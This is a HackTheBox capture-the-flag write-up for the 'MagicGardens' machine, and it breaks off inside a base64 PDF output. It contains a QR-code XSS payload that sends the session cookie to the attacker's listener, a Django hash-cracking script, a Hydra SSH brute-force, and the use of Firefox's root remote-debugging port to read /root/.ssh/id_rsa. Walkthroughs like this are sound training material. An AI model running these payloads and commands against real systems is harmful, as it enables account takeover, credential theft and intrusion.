---
title: "MagicGardens Writeup - HackTheBox"
date: 2024-10-09
draft: false
Tags:
- HackTheBox
- Linux
- Insane
---

| Link: | [https://app.hackthebox.com/machines/MagicGardens](https://app.hackthebox.com/machines/MagicGardens) |
| --- | --- |
| Difficulty | Insane |
| Machine | Linux |

---

## Enumeration

As usual, initiating an Nmap scan on this machine with the command **`nmap 10.10.11.9 -T4 -vv -p-`** yields the following output:

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
25/tcp   open  smtp    syn-ack
80/tcp   open  http    syn-ack
1337/tcp open  waste   syn-ack
5000/tcp open  upnp    syn-ack
```

I also conducted an aggressive scan on the ports, and here is the output for that:

```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+EeX4lxNTcWYvgDh0dFVJlf0h9G0LwupXad6GDD9ct6lKEgELk3y0YuoNg/tOzn8t3TvhMsfAK2zB8dKfenM4=
|   256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYE2YyLpUp0IAWy3y5WUxFUEuF51LNMOevqPNzYKudU
25/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: magicgardens.magicgardens.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http     syn-ack ttl 63 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Magic Gardens
|_http-favicon: Unknown favicon MD5: 2D4E563DC4B95F3EDDD2DA91D4ED426A
1337/tcp open  waste?   syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
|_    [x] Handshake error
5000/tcp open  ssl/http syn-ack ttl 62 Docker Registry (API: 2.0)
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-23T11:57:43
| Not valid after:  2024-05-22T11:57:43
| MD5:   2f97:8372:17ae:abe4:a4d9:5937:f438:3e71
| SHA-1: a6f9:ce07:c808:150a:00aa:f193:1b72:a963:f414:f57c
| -----BEGIN CERTIFICATE-----
| MIIFazCCA1OgAwIBAgIUDWhFdCp8MnPK7iV0Eqp2Tn4y5OQwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMzA1MjMxMTU3NDNaFw0yNDA1
| MjIxMTU3NDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
| HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
| AQUAA4ICDwAwggIKAoICAQDch9kz4icrrlZKg4blZD2CfpvP6Gj3SdJgywfEiJNu
| LX0Vxj1nxCNwcGuHsVXDIcHNfVjd8rS/zHrtUF70ONjXfWRPQo7jhEEV4+zTtXjz
| X4aoesPoYCD3fc7TSbLjWCJELKdtrdOxST0QMPkeQQYf37FARHvnGNAAKHEwL9mO
| EtvgRUvxKrUcKAB9XdAORZjzfSe67bedF47n7+CFx4imizS74dmXx99Kwgvb4JO3
| LrKlQR/K7lsqNAbykuPMxKrO2l1sVNMtxo5/BLkG2aTBMI12Mbr+dJ2C4LKGsSzj
| 2Z9vJR9EoOJCv5BzYmB2iCBe/6itnxFj+f1YJUDMA1j191O4gI9pp3K5hm9u5Avk
| kDhOgqfsaD02X/KFClnRnL3nY5GQAUw4HqLc3qgdf4DorD7hecEUehLhvYMDCBlq
| 0wdpwsOQCpQdJwg8fE+pyAciCpNc6tX73x5juhkyRaPg7okwMB9y0d1aN7601yCy
| TX0ITmMLP8WJUvRLTrmQWDDmg434gwc/GH8RoLyR12+B7731X07EXaA6nyNleMvg
| BV6X++MgItCuAQv4yVgfXJ49DL3n2SH66COElyr+L/m64gbuhsGjxNLIgELLKUkO
| 3lJbHTpqDzBGGo/C1/vYZE2gj7/JZPeDWm0otm1T3trKIHkGuSDqVcbe6Rm8xtGb
| 9QIDAQABo1MwUTAdBgNVHQ4EFgQUK9LKRtUE2IAKDDfGCrqB/hG1irMwHwYDVR0j
| BBgwFoAUK9LKRtUE2IAKDDfGCrqB/hG1irMwDwYDVR0TAQH/BAUwAwEB/zANBgkq
| hkiG9w0BAQsFAAOCAgEAM8+ImqdW9fT9jVE0XTGi0PmYM7bwXKWlJQU1NhzisuI2
| 7IzLsTH1HhysrMmksJu4/EdCMZdZFCpvPcZZqRzltJl0BW0Fcbl6YT12JCosbIRG
| GhhNKt/Pi/1/Gbx0e3WjzNHMN/3RN4ARFx5MxL6yImJDq7+Xr2FJNvUeQ4HyUEH0
| Qvz5PFhArLyUz3/NFqV4LxxyjxoLWyd8WXwFo71aq1GWLu9R/2RL+WPhN946TYlh
| p/iJV3SeemHIgRdWDGkXxRe6itp2zA/nkggxxy5TexbPY2z7VwAMqIizIKAEScFm
| t/cj12LxRswz2xicoNcC/nhoIxpZWh3qLfPh1W3gqMgAZvtPLDVQQvhNiJhJ2jPu
| D6SozctK1yA9uGkEFUEhOiNZ2X2vENiqJGggQsDQKDSrGS2sqZvKXoyNqcHQsUBI
| m5EZ6PQRgr4JMk2/JTqjpl2yN+EV7kfqrj5m6oiXmBOdg4osLse+7zLWUWSLwlic
| jrwMmoQsRbgKCA5+pB+CnKBVZjxKPw3qneqK3Gp2qVNf/yVKK0fFUhCYgRiqxfAz
| PhySBYrxEfqIqoMxCWIcnvvyil8rLJd4QEVAok5zZVIEohhlDhLZ60wnx2wNygA+
| s/nOcZJ2ylq6Lz7syIeAzG9YeLkFOuRtQXj8CuwhLcDPliLrrjJiwYmMYBpb7Z0=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=5/21%Time=664C4533%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\[
SF:x\]\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x2
SF:0error\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPCC
SF:heck,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"\
SF:[x\]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(Te
SF:rminalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15,
SF:"\[x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0")
SF:%r(LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,15
SF:,"\[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshake
SF:\x20error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")%
SF:r(NCP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Han
SF:dshake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%r
SF:(ms-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=5/21%OT=22%CT=%CU=36529%PV=Y%DS=2%DC=T%G=N%TM=664C4589%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 19.495 days (since Wed May  1 15:02:55 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   86.15 ms 10.10.14.1
2   90.57 ms magicgardens.htb (10.10.11.9)

```

I ran Gobuster on the HTTP port to explore the web service for any potentially interesting findings or endpoints. Here's the output from Gobuster:

```
/search               (Status: 301) [Size: 0] [--> /search/]
/login                (Status: 301) [Size: 0] [--> /login/]
/register             (Status: 301) [Size: 0] [--> /register/]
/profile              (Status: 301) [Size: 0] [--> /profile/]
/subscribe            (Status: 301) [Size: 0] [--> /subscribe/]
/catalog              (Status: 301) [Size: 0] [--> /catalog/]
/admin                (Status: 301) [Size: 0] [--> /admin/]
/cart                 (Status: 301) [Size: 0] [--> /cart/]
/logout               (Status: 301) [Size: 0] [--> /logout/]
/check                (Status: 301) [Size: 0] [--> /check/]

```

## Initial Access

I visited the 'admin' page, which displayed 'Django Login,' indicating it's a login page for a Django application. Additionally, I found an 'Upgrade Subscription' option in the '/profile' endpoint within our web application.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled.png)

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%201.png)

I intercepted the request and modified it to redirect to my bank (netcat session), resulting in the following outcome:

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 6969
listening on [any] 6969 ...
connect to [10.10.14.46] from (UNKNOWN) [10.10.11.9] 48528
POST /api/payments/ HTTP/1.1
Host: 10.10.14.46:6969
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 133
Content-Type: application/json

{"cardname": "Caleb Daniel", "cardnumber": "5358966261393853", "expmonth": "Janurary", "expyear": "2029", "cvv": "081", "amount": 25}

```

Not particularly useful in terms of gaining access, but we did identify that the web application is using Python Requests version 2.31.0. Perhaps we could attempt to create our own bank API with a similar structure required for the previous POST request and simulate a fake purchase to see if any vulnerabilities surface.

```
┌──(kali㉿kali)-[~/flask-bank-api]
└─$ ls
app.py
                                                                                                                                                             
┌──(kali㉿kali)-[~/flask-bank-api]
└─$ cat app.py               
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route('/api/payments/', methods=['POST'])
def handle_payment():
    req_json = request.get_json()
    req_json['status'] = "200"
    print(req_json)
    return jsonify(req_json)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)

                                                                                                                                                             
┌──(kali㉿kali)-[~/flask-bank-api]
└─$ python app.py                                                                                 
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.146.128:80
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 128-738-132
```

I replaced the bank URL with my own Flask API that we created, and subsequently, I observed the information being sent to us through our Flask app bank API.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%202.png)

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%203.png)

As we can see, the fake bank API we created enabled us to successfully complete the subscription process.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%204.png)

After some exploration and broadening the scope of the web application, I discovered an interesting feature: when purchasing a product (e.g., flowers), we receive a message from Morty offering a 25% discount in exchange for a QR code. Given that Morty is a valid user, I started considering the possibility of stealing his token using XSS through a file upload feature. This could be a potential avenue for further investigation.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%205.png)

I attempted to craft a malicious QR code PNG payload to capture the session token of the user 'morty.'

The payload I used was: **`098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b3f4de32357b9.</p><script>var i=new Image(); i.src="http://10.10.14.46:7777/?cookie="+btoa(document.cookie);</script><p>`, and Of course, this payload was embedded within a QR code in PNG format.**

I crafted this payload using the CyberChef website, then uploaded it to the message box. After waiting for a while, I successfully captured the cookie:

```
10.10.11.9 - - [21/May/2024 09:48:22] "GET /?cookie=Y3NyZnRva2VuPXpPVGE3bUhxRzhZUGc1TVA1V3lLRFNzOGZQbVF2ZVFFOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXM5UGxVOmMwZTRZaGJWVjlpem0yMVZudXl2YlNRR0NkcWI3VVlFbFhPMDlSVHpCSkU= HTTP/1.1" 200 -
```

Using the captured cookie, I successfully logged in to the Django admin login page.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%206.png)

I discovered the password hash on the admin page and then proceeded to write the following script to crack it:

```
from passlib.hash import django_pbkdf2_sha256
hash = 'HASH VALUE HERE' # enter the hash value here to decrypt
rounds = hash.split('$')[1]
salt = hash.split('$')[2]

with open("../rockyou.txt", "r", errors="ignore") as f:
        for key in f:
                secret = key.split()[0]
                print(secret, end='\r')
                if django_pbkdf2_sha256.hash(secret, rounds=rounds, salt=salt) == hash:
                        print("password: " + secret)
```

We also have the option to use hashcat, which successfully cracked the password as 'jonasbrothers.' Alternatively, we can perform SSH brute-forcing with Hydra using the rockyou.txt wordlist. I executed the command: **`hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb`** to attempt to brute-force the user 'morty' and see if it works. Indeed, it seems that by skipping the step of stealing the cookie and directly attempting SSH brute-forcing, we can still uncover the password.

After some time, the password was successfully cracked:

```
┌──(kali㉿kali)-[~]
└─$ hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 04:05:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://magicgardens.htb:22/
[STATUS] 109.00 tries/min, 109 tries in 00:01h, 14344293 to do in 2193:20h, 13 active
[STATUS] 92.00 tries/min, 276 tries in 00:03h, 14344126 to do in 2598:35h, 13 active
[STATUS] 85.86 tries/min, 601 tries in 00:07h, 14343801 to do in 2784:26h, 13 active
[STATUS] 81.93 tries/min, 1229 tries in 00:15h, 14343173 to do in 2917:40h, 13 active
[22][ssh] host: magicgardens.htb   login: morty   password: jonasbrothers
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-21 04:31:36
```

I promptly SSHed to the user account, but to my surprise, there was no user.txt file. It seems that it might be located in a different user's directory. Interestingly, there is a user named 'alex,' so it's possible our user flag might be there. Let's investigate further.

## Root Flag & User Flag

Upon running Linpeas on the machine, I discovered a Firefox process running as root, with remote debugging enabled and configured to allow localhost on port 34001. This could potentially provide us with a means of further exploration and privilege escalation.

```
root        1936  4.9 11.6 11875692 467716 ?     Sl   May20  16:51                  _ firefox-esr --marionette --headless --remote-debugging-port 34001 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileu1v0Uq
```

I proceeded to use Chisel to set up port forwarding to gain access from my local machine. Here's what I did after transferring Chisel to the Linux box:

1. On my Kali machine: **`./chisel server -p 8000 --reverse`**
2. On the target machine: **`./chisel client 10.10.14.46:8000 R:34001:127.0.0.1:34001`**

Once completed, we can access the Firefox remote debugging port at **`localhost:34001`**. This should enable us to interact with the Firefox process running as root on the target machine.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%207.png)

As observed, there is an **`httpd.js`** running on this port. I proceeded to attempt brute-forcing the directory, which uncovered various endpoints:

```
/trace                (Status: 200) [Size: 194]
/json                 (Status: 200) [Size: 302]
/session              (Status: 400) [Size: 61]
```

The "/trace" endpoint contains the following content:

```
Request-URI: http://localhost:34001/trace

Request (semantically equivalent, slightly reformatted):

GET /trace HTTP/1.1
host: localhost:51523
user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate
connection: close
cookie: jiveforums.admin.logviewer=logfile.size=1700758
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: none
sec-fetch-user: ?1
```

The "/json" endpoint contains the following content:

```
[
  {
    "description": "",
    "devtoolsFrontendUrl": null,
    "faviconUrl": "",
    "id": "96a0d569-23aa-46ad-8815-5fc1f1a4fbb8",
    "type": "page",
    "url": "http://magicgardens.htb/admin/store/order/",
    "webSocketDebuggerUrl": "ws://127.0.0.1:34001/devtools/page/96a0d569-23aa-46ad-8815-5fc1f1a4fbb8"
  }
]
```

I encountered an error when accessing the "/session" endpoint: "The handshake request has incorrect Upgrade header: undefined".

To address this, I installed websocat, similar to netcat, on my target machine from the following link: [websocat v1.13.0](https://github.com/vi/websocat/releases/tag/v1.13.0)

After installation, I executed the following command:

```
morty@magicgardens:/tmp$ curl http://127.0.0.1:34001/json/version
{
        "Browser": "Firefox/115.10.0",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "V8-Version": "1.0",
        "WebKit-Version": "1.0",
        "webSocketDebuggerUrl": "ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584"
}
```

After installing websocat, I proceeded to run the following command(on target machine):

```bash
echo '{"id": 1, "method": "Target.createTarget", "params": {"url": "file:///root/.ssh/id_rsa"}}' | ./websocat.x86_64-unknown-linux-musl ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584
{"id":1,"result":{"targetId":"151f6650-6d16-4d66-809b-f6dc06b2643b"}}
```

I was attempting to create a new target in the browser's DevTools by sending a JSON command through a WebSocket connection. I crafted a JSON string that included my desired method, "Target.createTarget," along with the parameters specifying the URL of a local file, which happened to be my SSH private key stored at "file:///root/.ssh/id_rsa." Using the **`websocat`** tool, I piped this command to the WebSocket server running at "ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584." Upon execution, I received a response in JSON format, indicating success with a new target ID: "151f6650-6d16-4d66-809b-f6dc06b2643b."

After this, I ran this:

```bash
echo 'Page.printToPDF {}' | ./websocat.x86_64-unknown-linux-musl -n1 --jsonrpc --jsonrpc-omit-jsonrpc ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b
```

I was working on printing the contents of a webpage to a PDF using the DevTools protocol over a WebSocket connection. After successfully creating a target with the ID "151f6650-6d16-4d66-809b-f6dc06b2643b," I prepared another command. This time, I needed to invoke the "Page.printToPDF" method to generate a PDF from the specified page. Using the **`websocat`** tool again, I sent the command in a JSON format without the "jsonrpc" field, which is a specific option for this tool. The WebSocket connection was established to the server at "ws://127.0.0.1:34001/devtools/page/151f6650-6d16-4d66-809b-f6dc06b2643b." This command was executed with the intent of printing the page to a PDF, streamlining the process for further handling or saving the document locally.

We received the following JSON file as a reply:

```json
{"id":1,"result":{"data":"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